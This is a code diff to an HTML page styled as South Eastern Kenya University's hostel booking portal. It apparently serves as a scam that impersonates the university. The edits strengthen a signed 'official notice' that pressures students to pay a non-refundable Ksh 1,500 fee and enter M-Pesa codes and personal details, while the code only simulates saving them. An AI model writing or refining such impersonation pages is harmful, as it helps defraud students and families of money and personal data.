@@ -358,7 +358,7 @@
     <div class="dashboard-header">
         <img src="seku.jpg" alt="South Eastern Kenya University Logo" class="dashboard-logo">
         <h2>Welcome, ACCOMMODATION PORTAL</h2> 
-        <div class="student-info">Admission No: <strong id="studentAdm"></strong> | Programme: <strong>Bsc.Public health</strong></div>
+        <div class="student-info">Admission No: <strong id="studentAdm"></strong> | Programme: <strong>Undergraduate</strong></div>
     </div>
     <div class="stats">
         <div class="stat-card booked"><h3 id="bookedCount">3471</h3><p>Vacancies Booked</p></div>
@@ -376,7 +376,7 @@
     <div id="adminRecords"></div>
     <button class="btn btn-secondary" onclick="closeAdminView()">← Return to Portal</button>
 </div>
-    <div class="container hidden" id="bookingPage">
+<div class="container hidden" id="bookingPage">
     <div id="alertBox"></div>
 
     <div id="bookStep1">
@@ -433,27 +433,54 @@
     </div>
 
     <div id="bookStep2" class="hidden">
-        <h2>Important Official Notice: <span id="selectedHostelName2"></span></h2>
+        <h2>Official Notice: To all continuing students</h2>
         <form onsubmit="nextBookingStep(3); return false;">
             <div class="scroll-agreement notice-box" id="noticeScroll" onscroll="checkScroll('noticeScroll','agreeNoticeBox','btnNotice')">
-                <h3>OFFICIAL NOTICE TO ADMITTED STUDENTS</h3>
-                <p>Following a joint directive from the Department of Health Sciences and the Accommodation Office at South Eastern Kenya University (SEKU), this is to officially notify all health sciences students of the upcoming relocation from the Main Campus to the Kitui Town Campus.This transition is designed to place students closer to primary clinical training sites, health facilities, and relevant professional resources in Kitui Town,the <b>South Eastern  Kenya University Accommodation Department</b> wishes to inform all 2,3,4 students on health sciences and business economics that hostel spaces are fully furnished at kitui town campus and will be prioritized to those who made their booking on time.</p><br>
-                <p>To secure your accommodation, you are required to pay a <b>mandatory booking fee of KES 1,500</b> via this official payment channel provided. This amount will be deducted from your total semester accommodation fees upon reporting.</p><br>
-                <p>Students are advised to complete this process early to avoid missing out on hostel space. The balance of your accommodation fees must be settled within the first week of reporting to the university.</p><br>
-                <h4 style="color:var(--mu-green);">Official Procedure:</h4>
-                <ol>
-                    <li>Complete payment as instructed on the next page.</li>
-                    <li>Submit payment verification details correctly.</li>
-                    <li>Receive confirmation email within 12 working hours.</li>
-                    <li>Print and present your booking confirmation slip during admission.</li>
-                </ol>
-                <p style="color:#dc3545; font-weight:bold; text-align:center; margin:15px 0;">⚠️ DO NOT make payments to any other number or account not listed here.</p>
+                
+                <h3>SOUTH EASTERN KENYA UNIVERSITY</h3>
+                <h4 style="text-align:center; font-weight:700; margin-bottom:15px;">DEPARTMENT OF ACCOMMODATION AND STUDENT WELFARE</h4>
+                <p style="text-align:center; font-style:italic; margin-bottom:20px;">Head of Department: Madam Maureen Kyalo</p>
+
+                <p>Due to the high number of first-year students placed at South Eastern Kenya University through KUCCPS for the 2026/2027 Academic Year, the Accommodation Office wishes to notify all continuing students as follows:</p>
+
+                <h4 style="color:var(--mu-green); margin-top:18px;">1. Priority Allocation</h4>
+                <p>Hostel spaces are limited. The Accommodation Office under the leadership of Madam Maureen Kyalo will give priority in room allocation to students who have successfully booked their vacancies and paid the required booking fee.</p>
+
+                <h4 style="color:var(--mu-green); margin-top:18px;">2. Booking Procedure & Fee</h4>
+                <p>All students interested in residing in university hostels are required to book their space immediately by paying a non-refundable booking fee of <strong>Ksh 1,500</strong>.</p>
+                <p>This booking fee will be deducted from your total semester accommodation fee. The remaining balance of the semester accommodation fee must be cleared towards the end of the semester.</p>
+
+                <h4 style="color:var(--mu-green); margin-top:18px;">3. Reason for Staggered Payment</h4>
+                <p>This milestone decision to allow payment of the booking fee first, and the balance in the first week, has been made to assist students and parents/guardians who may experience financial difficulties in paying the full accommodation fee on the day of admission due to the high number of admissions this year.</p>
+
+                <h4 style="color:var(--mu-green); margin-top:18px;">4. Confirmation Process</h4>
+                <p>Upon successful payment of the Ksh 1,500 booking fee to the official Accommodation Office account under Madam Maureen Kyalo, you will receive an official email within <strong>12 working hours</strong> containing your Hostel Booking Confirmation Ticket.</p>
+                <p>This ticket must be printed and presented to the Accommodation Office for verification and room allocation during the admission day.</p>
+
+                <h4 style="color:var(--mu-green); margin-top:18px;">5. Important Reminder</h4>
+                <p>Failure to book early may result in loss of university accommodation. Spaces will be allocated on a <strong>first-come, first-served basis</strong> until all vacancies are fully occupied.</p>
+
+                <p style="margin-top:20px; font-weight:700; text-align:center; color:var(--mu-green); font-size:15px;">Book your room now. Secure your space. Stay safe.</p>
+                <p>Students are advised to complete this process early to avoid missing out on hostel space. The balance of your accommodation fees must be settled within the first week of reporting to the university.</p>
+
+                <div class="procedure-box" style="background:var(--mu-light-gold); padding:18px; border-radius:6px; margin:20px 0; border-left:4px solid var(--mu-gold);">
+                    <h4 style="color:var(--mu-green); margin-bottom:12px;">Official Procedure:</h4>
+                    <ol style="padding-left:25px;">
+                        <li>Complete payment as instructed on the next page.</li>
+                        <li>Submit payment verification details correctly.</li>
+                        <li>Receive confirmation email within 12 working hours.</li>
+                        <li>Print and present your booking confirmation slip during admission.</li>
+                    </ol>
+                    <p class="warning" style="color:#dc3545; font-weight:bold; margin-top:15px;">⚠️ DO NOT make payments to any other number or account not listed here.</p>
+                </div>
+
                 <div class="signatory">
                     <br>Signed,<br>
                     <b>Maureen Kyalo</b><br>
                     Head of Accommodation & Student Welfare<br>
                     South Eastern Kenya University
                 </div>
+
                 <p style="height:20px;"></p>
                 <div class="agreement-checkbox" id="agreeNoticeBox">
                     <label style="display:flex; align-items:flex-start; gap:10px;">
@@ -467,7 +494,6 @@
             <button type="button" class="btn btn-secondary" onclick="prevBookingStep(1)">← Back</button>
         </form>
     </div>
-
     <div id="bookStep3" class="hidden">
         <div class="section-header">
             <h2>Hostel Booking Payment & Verification</h2>
@@ -583,6 +609,7 @@
         © 2026 South Eastern Kenya University. All Rights Reserved. Official Secure Portal.</p>
     </div>
 </div>
+
 <script>
 // Load saved permanent records first
 let bookedStudents = JSON.parse(localStorage.getItem('bookedStudents')) || {};
@@ -612,12 +639,12 @@ function togglePassword(){
     }
 }
 
-// === ✅ PROFESSIONAL FORGOT PASSWORD POPUP ===
+// === PROFESSIONAL FORGOT PASSWORD ===
 function forgotPassword(){
     alert("OFFICIAL NOTICE\n\nYour login password is your Admission Number — entered exactly as your username.\n\nFor further assistance, contact the Accommodation Office:\n📧 accommodation@seku.ac.ke\n📞 +254 758 903 000\n\nThis is the only official support channel for this portal.");
 }
 
-// === ADMIN SECRET FUNCTION ===
+// === ADMIN ACCESS ===
 function adminAccess(){
     const pass = prompt("Enter Administrator Password:");
     if(pass === ADMIN_PASS){
@@ -701,7 +728,7 @@ function checkScroll(scrollId, checkboxId, btnId){
     }
 }
 
-// === LOGIN FUNCTION — NO BLOCKING ===
+// === LOGIN SYSTEM ===
 function handleLogin(){
     const user = document.getElementById('username').value.toUpperCase().trim();
     const pass = document.getElementById('password').value.toUpperCase().trim();
@@ -782,7 +809,7 @@ function showBookingStep(n){
 function nextBookingStep(n){ showBookingStep(n); }
 function prevBookingStep(n){ showBookingStep(n); }
 
-// === FULLY COMPLETED PAYMENT FUNCTION ===
+// === PAYMENT SUBMISSION ===
 function submitPayment(){
     const code = document.getElementById('mpesaCode').value.trim().toUpperCase();
     const surname = document.getElementById('surname').value.trim();
@@ -792,7 +819,6 @@ function submitPayment(){
     const alertDiv = document.getElementById('alertBox');
     const submitBtn = document.getElementById('submitBtn');
 
-    // Validation
     if(!code || !surname || !otherNames || !email || !faculty){
         alertDiv.innerHTML = "<div class='alert alert-error'>⚠️ Please complete all required fields correctly</div>";
         return;
@@ -802,22 +828,18 @@ function submitPayment(){
         return;
     }
 
-    // Prevent duplicate booking
     if(bookedStudents[loggedInUser.adm]){
         alertDiv.innerHTML = "<div class='alert alert-error'>⚠️ A booking already exists for this admission number</div>";
         return;
     }
 
-    // Disable button & show loading
     submitBtn.innerHTML = `<span class="loading"></span>Processing...`;
     submitBtn.disabled = true;
     alertDiv.innerHTML = "";
 
-    // Simulate saving
     setTimeout(() => {
         const fullName = `${surname} ${otherNames}`;
 
-        // Save permanent records
         bookedStudents[loggedInUser.adm] = {
             hostel: selectedHostel.name,
             name: fullName,
@@ -836,7 +858,6 @@ function submitPayment(){
         localStorage.setItem('bookedStudents', JSON.stringify(bookedStudents));
         localStorage.setItem('paymentRecords', JSON.stringify(paymentRecords));
 
-        // Update confirmation page
         document.getElementById('finalHostel').innerText = selectedHostel.name;
         document.getElementById('finalAdmission').innerText = loggedInUser.adm;
         document.getElementById('finalCode').innerText = code;
@@ -844,7 +865,6 @@ function submitPayment(){
         document.getElementById('finalEmail').innerText = email;
         document.getElementById('finalFaculty').innerText = faculty;
 
-        // Show success page
         showBookingStep(4);
     }, 1500);
 }
@@ -855,7 +875,7 @@ function backToDashboard(){
     selectedHostel = null;
 }
 
-// === ✅ PROFESSIONAL LOGOUT POPUP ===
+// === LOGOUT FUNCTION ===
 function logout(){
     if(confirm("CONFIRM LOGOUT\n\nAre you sure you wish to end your current session?\n\nUnsaved progress will be lost.")){
         loggedInUser = null;
@@ -867,4 +887,5 @@ function logout(){
     }
 }
 </script>
-
+</body>
+</html>
